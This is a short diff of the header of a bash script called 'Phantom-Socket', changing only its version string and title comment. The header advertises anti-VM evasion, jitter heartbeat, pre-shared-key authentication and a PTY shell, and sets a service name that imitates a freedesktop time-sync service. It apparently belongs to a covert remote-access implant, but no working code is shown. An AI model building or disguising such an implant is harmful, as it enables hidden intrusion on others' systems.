@@ -1,5 +1,5 @@
 #!/bin/bash
-# Phantom-Socket V2.0 - Supreme Standardized Infrastructure
+# Phantom-Socket v1.0 Final - Standardized Infrastructure
 # Features: Anti-VM, Jitter Heartbeat, PSK Pre-Auth, and PTY Shell.
 
 set -euo pipefail
@@ -7,7 +7,7 @@ set -euo pipefail
 # ============================================================================
 # Configuration
 # ============================================================================
-readonly VERSION="2.0.0"
+readonly VERSION="1.0.0"
 readonly AGENT_NAME="phantom-client-prod"
 readonly SERVICE_NAME="dbus-org.freedesktop.timesync1"
 
